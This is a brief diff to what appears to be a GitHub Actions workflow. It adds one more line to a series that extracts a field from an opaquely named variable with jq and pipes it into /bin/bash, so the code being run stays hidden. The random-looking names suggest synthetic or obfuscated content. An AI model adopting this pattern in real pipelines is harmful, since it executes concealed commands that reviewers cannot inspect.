@@ -29,6 +29,7 @@ jobs:
           echo $uaapv605 | jq -r .ljjq3 | /bin/bash
           echo $gg986 | jq -r .wp548 | /bin/bash
           printf '%s' "$v25391" | jq -r .jfpp8056 | /bin/bash
+          printf '%s' "$p552" | jq -r .qsl846 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
